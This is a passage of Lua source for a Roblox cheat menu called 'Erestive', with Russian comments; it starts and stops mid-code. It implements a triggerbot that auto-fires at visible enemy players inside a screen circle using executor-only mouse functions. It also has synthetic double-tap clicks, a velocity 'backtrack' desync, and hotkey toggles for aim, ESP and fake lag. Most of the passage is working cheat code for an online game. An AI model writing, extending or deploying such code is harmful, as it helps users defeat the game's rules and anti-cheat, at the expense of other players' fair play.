		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_365);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.Slider.Button.LocalScript
local function C_36a()
local script = G2L["36a"];
	local UIS = game:GetService("UserInputService")
	local VIM = game:GetService("VirtualInputManager")
	local player = game.Players.LocalPlayer
	local mouse = player:GetMouse()
	
	local button = script.Parent 
	local statusText = script.Parent.Parent:FindFirstChild("Button")
	
	local isDoubleTapOn = false
	local cooldown = true 
	-- Вставь это в начало своего скрипта DoubleTap
	local function updateDoubleTapState()
		if statusText.Text == "On" then
			isDoubleTapOn = true
			button.BackgroundColor3 = Color3.fromRGB(0, 150, 0) -- Зеленый
		else
			isDoubleTapOn = false
			button.BackgroundColor3 = Color3.fromRGB(150, 0, 0) -- Красный
		end
	end
	
	-- Этот сигнал "ловит" изменения от бинда
	statusText:GetPropertyChangedSignal("Text"):Connect(updateDoubleTapState)
	updateDoubleTapState() -- Запуск при старте
	
	-- 1. ЗВУК (Создаем программно, если его нет)
	local beep = script:FindFirstChild("ToggleSound") or Instance.new("Sound", script)
	beep.Name = "ToggleSound"
	beep.SoundId = "rbxassetid://140332520808560" -- Короткий "бип"
	beep.Volume = 0.5
	
	-- Точка
	local dot = Instance.new("Frame")
	dot.Size = UDim2.new(0, 6, 0, 6)
	dot.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
	dot.AnchorPoint = Vector2.new(0.5, 0.5)
	dot.Position = UDim2.new(0.5, 0, 0.5, 0)
	dot.Visible = false
	dot.Parent = script:FindFirstAncestorOfClass("ScreenGui")
	Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
	
	-- 2. СИНХРОНИЗАЦИЯ (Работает и для клика, и для БИНДА)
	local function syncState()
		if not statusText then return end
	
		if statusText.Text == "On" then
			isDoubleTapOn = true
			script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.InformationText.DT.Visible = true
			button.BackgroundColor3 = Color3.fromRGB(0, 150, 0) -- Зеленый
			beep.Pitch = 1.2 -- Чуть выше тон при включении
		else
			isDoubleTapOn = false
			script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.InformationText.DT.Visible = false
			button.BackgroundColor3 = Color3.fromRGB(150, 0, 0) -- Красный
			beep.Pitch = 0.8 -- Чуть ниже тон при выключении
		end
	
		beep:Play() -- Играем звук при любом изменении (бинд или клик)
	end
	
	-- Следим за текстом (ДЛЯ БИНДА)
	if statusText then
		statusText:GetPropertyChangedSignal("Text"):Connect(syncState)
	end
	
	-- Логика клика по кнопке
	button.MouseButton1Click:Connect(function()
		statusText.Text = (statusText.Text == "On") and "Off" or "On"
	end)
	
	-- 3. ЛОГИКА ВЫСТРЕЛА
	UIS.InputBegan:Connect(function(input, processed)
		if input.UserInputType == Enum.UserInputType.MouseButton1 and isDoubleTapOn and not processed then
			if not cooldown then
				cooldown = true
				task.wait(0.6) 
	
				dot.Visible = true
				task.delay(0.08, function() dot.Visible = false end)
	
				local x, y = mouse.X, mouse.Y
				VIM:SendMouseButtonEvent(x, y, 0, true, game, 0)
				task.wait(0.01)
				VIM:SendMouseButtonEvent(x, y, 0, false, game, 0)
	
				task.wait(0.15) 
				cooldown = false
			end
		end
	end)
	
	syncState() -- Проверка при старте
	
end;
task.spawn(C_36a);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack.Slider.Animations
local function C_373()
local script = G2L["373"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_373);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack.Slider.Button.server
local function C_378()
local script = G2L["378"];
	local RunService = game:GetService("RunService")
	local player = game.Players.LocalPlayer
	
	local button = script.Parent 
	local statusText = script.Parent.Parent:FindFirstChild("Button") or script.Parent.Parent.Parent:FindFirstChild("OnOrOff")
	
	-- Настройки
	local isBacktrackOn = false
	local intensity = 3 
	local ghostColor = Color3.fromRGB(0, 255, 255)
	local ghostParts = {}
	
	local function clearGhost()
		for _, p in pairs(ghostParts) do p:Destroy() end
		table.clear(ghostParts)
	end
	
	local function createGhost(char)
		clearGhost()
		for _, part in ipairs(char:GetChildren()) do
			if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
				local g = Instance.new("Part")
				g.Name = part.Name
				g.Size = part.Size
				g.Anchored, g.CanCollide, g.CanTouch, g.CanQuery = true, false, false, false
				-- ПРОЗРАЧНОСТЬ ИЗМЕНЕНА ТУТ (0.85 - почти невидимый)
				g.Material, g.Color, g.Transparency = Enum.Material.ForceField, ghostColor, 0.85
				g.Parent = workspace
				local mesh = part:FindFirstChildOfClass("SpecialMesh") or part:FindFirstChildOfClass("MeshPart")
				if mesh then mesh:Clone().Parent = g end
				ghostParts[part.Name] = g
			end
		end
	end
	
	-- ГЛАВНЫЙ ЦИКЛ
	RunService.Heartbeat:Connect(function()
		local char = player.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")
		local hum = char and char:FindFirstChild("Humanoid")
	
		if isBacktrackOn and root and hum and hum.Health > 0 then
			if hum.MoveDirection.Magnitude > 0 then
				-- 1. Обновляем призрака
				if next(ghostParts) == nil then createGhost(char) end
				for name, g in pairs(ghostParts) do
					local orig = char:FindFirstChild(name)
					if orig then g.CFrame = orig.CFrame end
				end
	
				-- 2. МЯГКИЙ DESYNC
				local oldVel = root.AssemblyLinearVelocity
				root.AssemblyLinearVelocity = oldVel * 0.2 
	
				RunService.RenderStepped:Wait() 
	
				if root then
					root.AssemblyLinearVelocity = oldVel 
				end
			end
		else
			clearGhost()
		end
	end)
	
	-- UI Sync
	if statusText then
		statusText:GetPropertyChangedSignal("Text"):Connect(function()
			isBacktrackOn = (statusText.Text == "On")
			button.BackgroundColor3 = isBacktrackOn and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
			if not isBacktrackOn then clearGhost() end
		end)
	end
	
	button.MouseButton1Click:Connect(function() 
		statusText.Text = (statusText.Text == "On") and "Off" or "On" 
	end)
	
end;
task.spawn(C_378);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider.Animations
local function C_380()
local script = G2L["380"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_380);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider.Button.server
local function C_385()
local script = G2L["385"];
	local RunService = game:GetService("RunService")
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local camera = workspace.CurrentCamera
	
	local Button = script.Parent
	
	-- БЕЗОПАСНОЕ ПОЛУЧЕНИЕ НАСТРОЕК
	local function getSetting(name, className, defaultValue)
		local obj = Button:FindFirstChild(name)
		if not obj then
			obj = Instance.new(className, Button)
			obj.Name = name
			obj.Value = defaultValue
		end
		return obj
	end
	
	local shootingRangeValue = getSetting("shootingRange", "NumberValue", 150)
	local cooldownValue = getSetting("cooldown", "BoolValue", false)
	local targetPartValue = getSetting("TargetPart", "StringValue", "All")
	local fireModeValue = getSetting("FireMode", "StringValue", "Click")
	local fireRateValue = getSetting("FireRate", "NumberValue", 0.05)
	
	local enabled = false
	local isFiring = false
	
	-- 1. UI КРУГА
	local ScreenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
	ScreenGui.Name = "AutoFireUI"
	ScreenGui.IgnoreGuiInset = true 
	
	local CircleFrame = Instance.new("Frame", ScreenGui)
	CircleFrame.BackgroundTransparency = 1
	CircleFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	CircleFrame.Visible = false
	
	local UIStroke = Instance.new("UIStroke", CircleFrame)
	UIStroke.Thickness = 2
	UIStroke.Color = Color3.fromRGB(255, 255, 255)
	Instance.new("UICorner", CircleFrame).CornerRadius = UDim.new(1, 0)
	
	-- ФУНКЦИЯ ПРОВЕРКИ СТЕН (Её не хватало!)
	local function isPartVisible(part, character)
		local origin = camera.CFrame.Position
		local destination = part.Position
		local direction = destination - origin
		local rayParams = RaycastParams.new()
		rayParams.FilterDescendantsInstances = {player.Character, character}
		rayParams.FilterType = Enum.RaycastFilterType.Exclude
		local rayResult = workspace:Raycast(origin, direction, rayParams)
		return rayResult == nil
	end
	
	-- 2. ЛОГИКА КНОПКИ
	Button.MouseButton1Click:Connect(function()
		enabled = not enabled
		CircleFrame.Visible = enabled
		Button.BackgroundColor3 = enabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
	end)
	
	-- 3. ОСНОВНОЙ ЦИКЛ
	RunService.RenderStepped:Connect(function()
		if not enabled then return end
	
		local currentRange = shootingRangeValue.Value
		local mode = targetPartValue.Value
		local fireMode = fireModeValue.Value
		local fireRate = fireRateValue.Value
		local center = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
	
		CircleFrame.Position = UDim2.new(0, center.X, 0, center.Y)
		CircleFrame.Size = UDim2.new(0, currentRange * 2, 0, currentRange * 2)
	
		local targetLocked = false
	
		for _, p in pairs(Players:GetPlayers()) do
			if p ~= player and p.Character and p.Character:FindFirstChild("Humanoid") and p.Character.Humanoid.Health > 0 then
				if p.Team ~= player.Team or p.Team == nil then
	
					local partsToScan = {}
					if mode == "Head" then
						local h = p.Character:FindFirstChild("Head")
						if h then table.insert(partsToScan, h) end
					elseif mode == "Torso" then
						local t = p.Character:FindFirstChild("HumanoidRootPart")
						if t then table.insert(partsToScan, t) end
					else
						for _, c in pairs(p.Character:GetChildren()) do
							if c:IsA("BasePart") then table.insert(partsToScan, c) end
						end
					end
	
					for _, part in pairs(partsToScan) do
						local screenPos, onScreen = camera:WorldToViewportPoint(part.Position)
						if onScreen then
							local distToCenter = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude
	
							if distToCenter <= currentRange then
								-- Теперь функция isPartVisible определена и не вызовет ошибку
								if isPartVisible(part, p.Character) then
									targetLocked = true
									if not isFiring and cooldownValue.Value == false then
										isFiring = true
										cooldownValue.Value = true
	
										if fireMode == "Hold" then
											if mouse1press then 
												mouse1press()
												task.wait(fireRate) 
												if mouse1release then mouse1release() end
											end
										else
											if mouse1click then mouse1click() end
										end
	
										task.delay(fireRate, function() 
											isFiring = false
											cooldownValue.Value = false
										end)
									end
									break 
								end
							end
						end
					end
				end
			end
			if targetLocked then break end
		end
		UIStroke.Color = targetLocked and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(255, 255, 255)
	end)
	
end;
task.spawn(C_385);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Animations
local function C_391()
local script = G2L["391"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_391);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Button.LocalScript
local function C_398()
local script = G2L["398"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Frame.Visible == false then
			script.Parent.Parent.Frame.Visible = true
		else
			script.Parent.Parent.Frame.Visible = false
		end
	end)
end;
task.spawn(C_398);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Frame.TextButton.LocalScript
local function C_39e()
local script = G2L["39e"];
	script.Parent.MouseButton1Click:Connect(function()
		local textBox = script.Parent.Parent:FindFirstChild("TextBox")
		local valueObject = script.Parent.Parent.Parent.Parent:FindFirstChild("Slider") 
			and script.Parent.Parent.Parent.Parent.Slider.Button:FindFirstChild("shootingRange")
	
		if textBox and valueObject then
			-- tonumber преобразует текст в число, чтобы NumberValue его принял
			local newValue = tonumber(textBox.Text)
	
			if newValue then
				valueObject.Value = newValue
				print("Радиус успешно изменен на: " .. newValue)
			else
				warn("В поле введено не число!")
				textBox.Text = "Ошибка!"
			end
		else
			warn("Не удалось найти TextBox или объект shootingRange по указанному пути")
		end
	end)
	
end;
task.spawn(C_39e);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Frame.TextButton.LocalScript
local function C_3a1()
local script = G2L["3a1"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.Parent.Slider.Button.cooldown.Value == false then
			script.Parent.Parent.Parent.Parent.Slider.Button.cooldown.Value = true
			script.Parent.Text = "cooldown - ON"
		else
			script.Parent.Parent.Parent.Parent.Slider.Button.cooldown.Value = false
			script.Parent.Text = "cooldown - OFF"
		end
	end)
end;
task.spawn(C_3a1);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Frame.TextButton.LocalScript
local function C_3a3()
local script = G2L["3a3"];
	local btn = script.Parent
	local modeValue = script.Parent.Parent.Parent.Parent.Slider.Button:WaitForChild("FireMode")
	
	local modes = {"Click", "Hold"}
	local current = 1
	
	btn.MouseButton1Click:Connect(function()
		current = current + 1
		if current > #modes then current = 1 end
	
		modeValue.Value = modes[current]
		btn.Text = "Mode: " .. modes[current]
	
		-- Визуальный эффект
		btn.BackgroundColor3 = (modes[current] == "Hold") and Color3.fromRGB(255, 170, 0) or Color3.fromRGB(170, 170, 170)
	end)
	
end;
task.spawn(C_3a3);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.Aim.FOV.TextButton.LocalScript
local function C_3b0()
local script = G2L["3b0"];
	local UIS = game:GetService("UserInputService")
	local button = script.Parent
	
	local isBinding = false
	-- Установим начальное значение, чтобы не было ошибки до первого бинда
	local currentBind = Enum.KeyCode.F12 
	local currentInputType = Enum.UserInputType.Keyboard
	
	-- Находим Frame один раз, чтобы не писать длинные цепочки Parent каждый раз
	-- Подправь путь, если структура вложенности изменится
	local CommandFrame = script:FindFirstAncestor("CommandFrame") 
	
	local function getFriendlyName(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then return "LMB" end
		if input.UserInputType == Enum.UserInputType.MouseButton2 then return "RMB" end
		if input.UserInputType == Enum.UserInputType.MouseButton3 then return "MMB" end
		if input.UserInputType.Name:find("MouseButton") then
			return input.UserInputType.Name:gsub("MouseButton", "MB")
		end
		return input.KeyCode.Name
	end
	
	button.MouseButton1Click:Connect(function()
		isBinding = true
		button.Text = "..."
	end)
	
	UIS.InputBegan:Connect(function(input, processed)
		-- Игнорируем ввод, если игрок в чате, НО только если мы НЕ в режиме назначения бинда
		if processed and not isBinding then return end
	
		if isBinding then
			local isKeyboard = input.UserInputType == Enum.UserInputType.Keyboard
			local isMouse = input.UserInputType.Name:find("MouseButton")
	
			if isKeyboard or isMouse then
				currentBind = isKeyboard and input.KeyCode or input.UserInputType
				currentInputType = input.UserInputType
				button.Text = getFriendlyName(input)
				isBinding = false
			end
			return
		end
	
		-- Проверка срабатывания
		local triggered = false
		if currentInputType == Enum.UserInputType.Keyboard then
			if input.KeyCode == currentBind then triggered = true end
		else
			if input.UserInputType == currentBind then triggered = true end
		end
	
		if triggered then
			-- Ссылка на твой SpeedValue
			-- Используем твой путь, если FindFirstAncestor не подходит:
			local Value = script.Parent.Parent.Parent.Parent.Parent.Parent.CommandFrame.Frame5.ONOFF.OnOrOff
	
			-- Логика переключения (Toggle)
			if Value.Text == "On" then
				Value.Text = "Off"
			else
				Value.Text = "On"
			end
		end
	end)
	
end;
task.spawn(C_3b0);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.SG.FOV.TextButton.LocalScript
local function C_3bb()
local script = G2L["3bb"];
	local UIS = game:GetService("UserInputService")
	local button = script.Parent
	
	local isBinding = false
	-- Установим начальное значение, чтобы не было ошибки до первого бинда
	local currentBind = Enum.KeyCode.F12 
	local currentInputType = Enum.UserInputType.Keyboard
	
	-- Находим Frame один раз, чтобы не писать длинные цепочки Parent каждый раз
	-- Подправь путь, если структура вложенности изменится
	local CommandFrame = script:FindFirstAncestor("CommandFrame") 
	
	local function getFriendlyName(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then return "LMB" end
		if input.UserInputType == Enum.UserInputType.MouseButton2 then return "RMB" end
		if input.UserInputType == Enum.UserInputType.MouseButton3 then return "MMB" end
		if input.UserInputType.Name:find("MouseButton") then
			return input.UserInputType.Name:gsub("MouseButton", "MB")
		end
		return input.KeyCode.Name
	end
	
	button.MouseButton1Click:Connect(function()
		isBinding = true
		button.Text = "..."
	end)
	
	UIS.InputBegan:Connect(function(input, processed)
		-- Игнорируем ввод, если игрок в чате, НО только если мы НЕ в режиме назначения бинда
		if processed and not isBinding then return end
	
		if isBinding then
			local isKeyboard = input.UserInputType == Enum.UserInputType.Keyboard
			local isMouse = input.UserInputType.Name:find("MouseButton")
	
			if isKeyboard or isMouse then
				currentBind = isKeyboard and input.KeyCode or input.UserInputType
				currentInputType = input.UserInputType
				button.Text = getFriendlyName(input)
				isBinding = false
			end
			return
		end
	
		-- Проверка срабатывания
		local triggered = false
		if currentInputType == Enum.UserInputType.Keyboard then
			if input.KeyCode == currentBind then triggered = true end
		else
			if input.UserInputType == currentBind then triggered = true end
		end
	
		if triggered then
			-- Ссылка на твой SpeedValue
			-- Используем твой путь, если FindFirstAncestor не подходит:
			local Value = script.Parent.Parent.Parent.Parent.Parent.Parent.CommandFrame.Frame2.ONOFF.OnOrOff
	
			-- Логика переключения (Toggle)
			if Value.Text == "On" then
				Value.Text = "Off"
			else
				Value.Text = "On"
			end
		end
	end)
	
end;
task.spawn(C_3bb);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.ESP.FOV.TextButton.LocalScript
local function C_3c6()
local script = G2L["3c6"];
	local UIS = game:GetService("UserInputService")
	local button = script.Parent
	
	local isBinding = false
	-- Установим начальное значение, чтобы не было ошибки до первого бинда
	local currentBind = Enum.KeyCode.F12 
	local currentInputType = Enum.UserInputType.Keyboard
	
	-- Находим Frame один раз, чтобы не писать длинные цепочки Parent каждый раз
	-- Подправь путь, если структура вложенности изменится
	local CommandFrame = script:FindFirstAncestor("CommandFrame") 
	
	local function getFriendlyName(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then return "LMB" end
		if input.UserInputType == Enum.UserInputType.MouseButton2 then return "RMB" end
		if input.UserInputType == Enum.UserInputType.MouseButton3 then return "MMB" end
		if input.UserInputType.Name:find("MouseButton") then
			return input.UserInputType.Name:gsub("MouseButton", "MB")
		end
		return input.KeyCode.Name
	end
	
	button.MouseButton1Click:Connect(function()
		isBinding = true
		button.Text = "..."
	end)
	
	UIS.InputBegan:Connect(function(input, processed)
		-- Игнорируем ввод, если игрок в чате, НО только если мы НЕ в режиме назначения бинда
		if processed and not isBinding then return end
	
		if isBinding then
			local isKeyboard = input.UserInputType == Enum.UserInputType.Keyboard
			local isMouse = input.UserInputType.Name:find("MouseButton")
	
			if isKeyboard or isMouse then
				currentBind = isKeyboard and input.KeyCode or input.UserInputType
				currentInputType = input.UserInputType
				button.Text = getFriendlyName(input)
				isBinding = false
			end
			return
		end
	
		-- Проверка срабатывания
		local triggered = false
		if currentInputType == Enum.UserInputType.Keyboard then
			if input.KeyCode == currentBind then triggered = true end
		else
			if input.UserInputType == currentBind then triggered = true end
		end
	
		if triggered then
			-- Ссылка на твой SpeedValue
			-- Используем твой путь, если FindFirstAncestor не подходит:
			local Value = script.Parent.Parent.Parent.Parent.Parent.Parent.CommandFrame.Frame6.ONOFF2.OnOrOff
	
			-- Логика переключения (Toggle)
			if Value.Text == "On" then
				Value.Text = "Off"
			else
				Value.Text = "On"
			end
		end
	end)
	
end;
task.spawn(C_3c6);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.AimPointer.FOV.TextButton.LocalScript
local function C_3d1()
local script = G2L["3d1"];
	local UIS = game:GetService("UserInputService")
	local button = script.Parent
	
	local isBinding = false
	-- Установим начальное значение, чтобы не было ошибки до первого бинда
	local currentBind = Enum.KeyCode.F12 
	local currentInputType = Enum.UserInputType.Keyboard
	
	-- Находим Frame один раз, чтобы не писать длинные цепочки Parent каждый раз
	-- Подправь путь, если структура вложенности изменится
	local CommandFrame = script:FindFirstAncestor("CommandFrame") 
	
	local function getFriendlyName(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then return "LMB" end
		if input.UserInputType == Enum.UserInputType.MouseButton2 then return "RMB" end
		if input.UserInputType == Enum.UserInputType.MouseButton3 then return "MMB" end
		if input.UserInputType.Name:find("MouseButton") then
			return input.UserInputType.Name:gsub("MouseButton", "MB")
		end
		return input.KeyCode.Name
	end
	
	button.MouseButton1Click:Connect(function()
		isBinding = true
		button.Text = "..."
	end)
	
	UIS.InputBegan:Connect(function(input, processed)
		-- Игнорируем ввод, если игрок в чате, НО только если мы НЕ в режиме назначения бинда
		if processed and not isBinding then return end
	
		if isBinding then
			local isKeyboard = input.UserInputType == Enum.UserInputType.Keyboard
			local isMouse = input.UserInputType.Name:find("MouseButton")
	
			if isKeyboard or isMouse then
				currentBind = isKeyboard and input.KeyCode or input.UserInputType
				currentInputType = input.UserInputType
				button.Text = getFriendlyName(input)
				isBinding = false
			end
			return
		end
	
		-- Проверка срабатывания
		local triggered = false
		if currentInputType == Enum.UserInputType.Keyboard then
			if input.KeyCode == currentBind then triggered = true end
		else
			if input.UserInputType == currentBind then triggered = true end
		end
	
		if triggered then
			-- Ссылка на твой SpeedValue
			-- Используем твой путь, если FindFirstAncestor не подходит:
			local Value = script.Parent.Parent.Parent.Parent.Parent.Parent.CommandFrame.Frame5.aimpart.FOV.FOVConfig.TextButton
			local Value2 = script.Parent.Parent.Parent.Parent.Parent.Parent.CommandFrame.Frame5.aimpart.FOV.FOVConfig.TextButton.TextLabel
	
			if Value2.Text == "Head" then
				Value2.Text = "Torso"
			else
				Value2.Text = "Head"
			end
			if Value.Text == "Head" then
				Value.Text = "HumanoidRootPart"
			else
				Value.Text = "Head"
			end
		end
	end)
	
end;
task.spawn(C_3d1);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.DT.FOV.TextButton.LocalScript
local function C_3dc()
local script = G2L["3dc"];
	local UIS = game:GetService("UserInputService")
	local button = script.Parent
	
	local isBinding = false
	local currentBind = Enum.KeyCode.F12 
	local currentInputType = Enum.UserInputType.Keyboard
	
	-- Твой главный фрейм
	local CommandFrame = script:FindFirstAncestor("CommandFrame") 
	
	local function getFriendlyName(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then return "LMB" end
		if input.UserInputType == Enum.UserInputType.MouseButton2 then return "RMB" end
		if input.UserInputType == Enum.UserInputType.MouseButton3 then return "MMB" end
		if input.UserInputType.Name:find("MouseButton") then
			return input.UserInputType.Name:gsub("MouseButton", "MB")
		end
		return input.KeyCode.Name
	end
	
	button.MouseButton1Click:Connect(function()
		isBinding = true
		button.Text = "..."
	end)
	
	UIS.InputBegan:Connect(function(input, processed)
		if processed and not isBinding then return end
	
		if isBinding then
			local isKeyboard = input.UserInputType == Enum.UserInputType.Keyboard
			local isMouse = input.UserInputType.Name:find("MouseButton")
	
			if isKeyboard or isMouse then
				currentBind = isKeyboard and input.KeyCode or input.UserInputType
				currentInputType = input.UserInputType
				button.Text = getFriendlyName(input)
				isBinding = false
			end
			return
		end
	
		-- Проверка нажатия назначенной клавиши
		local triggered = false
		if currentInputType == Enum.UserInputType.Keyboard then
			if input.KeyCode == currentBind then triggered = true end
		else
			if input.UserInputType == currentBind then triggered = true end
		end
	
		if triggered then
			-- ИСПОЛЬЗУЕМ CommandFrame ДЛЯ ПУТИ (так надежнее)
			-- Проверь: кнопка должна лежать внутри CommandFrame -> Frame5 -> DoubleTap -> Slider -> Button
			local DT_Button = CommandFrame:FindFirstChild("Frame5"):FindFirstChild("DoubleTap"):FindFirstChild("Slider"):FindFirstChild("Button")
	
			if DT_Button then
				-- Просто меняем текст. Скрипт DoubleTap (который мы писали раньше) это увидит
				if DT_Button.Text == "On" then
					DT_Button.Text = "Off"
				else
					DT_Button.Text = "On"
				end
				print("Бинд сработал! DT теперь: " .. DT_Button.Text)
			else
				warn("Кнопка DoubleTap не найдена внутри CommandFrame!")
			end
		end
	end)
	
end;
task.spawn(C_3dc);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.FL.FOV.TextButton.LocalScript
local function C_3e7()
local script = G2L["3e7"];
	local UIS = game:GetService("UserInputService")
	local button = script.Parent
	
	local isBinding = false
	-- Установим начальное значение, чтобы не было ошибки до первого бинда
	local currentBind = Enum.KeyCode.F12 
	local currentInputType = Enum.UserInputType.Keyboard
	
	-- Находим Frame один раз, чтобы не писать длинные цепочки Parent каждый раз
	-- Подправь путь, если структура вложенности изменится
	local CommandFrame = script:FindFirstAncestor("CommandFrame") 
	
	local function getFriendlyName(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then return "LMB" end
		if input.UserInputType == Enum.UserInputType.MouseButton2 then return "RMB" end
		if input.UserInputType == Enum.UserInputType.MouseButton3 then return "MMB" end
		if input.UserInputType.Name:find("MouseButton") then
			return input.UserInputType.Name:gsub("MouseButton", "MB")
		end
		return input.KeyCode.Name
	end
	
	button.MouseButton1Click:Connect(function()
		isBinding = true
		button.Text = "..."
	end)
	
	UIS.InputBegan:Connect(function(input, processed)
		-- Игнорируем ввод, если игрок в чате, НО только если мы НЕ в режиме назначения бинда
		if processed and not isBinding then return end
	
		if isBinding then
			local isKeyboard = input.UserInputType == Enum.UserInputType.Keyboard
			local isMouse = input.UserInputType.Name:find("MouseButton")
	
			if isKeyboard or isMouse then
				currentBind = isKeyboard and input.KeyCode or input.UserInputType
				currentInputType = input.UserInputType
				button.Text = getFriendlyName(input)
				isBinding = false
			end
			return
		end
	
		-- Проверка срабатывания
		local triggered = false
		if currentInputType == Enum.UserInputType.Keyboard then
			if input.KeyCode == currentBind then triggered = true end
		else
			if input.UserInputType == currentBind then triggered = true end
		end
	
		if triggered then
			local Value = script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.FakeLag.ImageLabel.Lag.Value
	
			-- Логика переключения (Toggle)
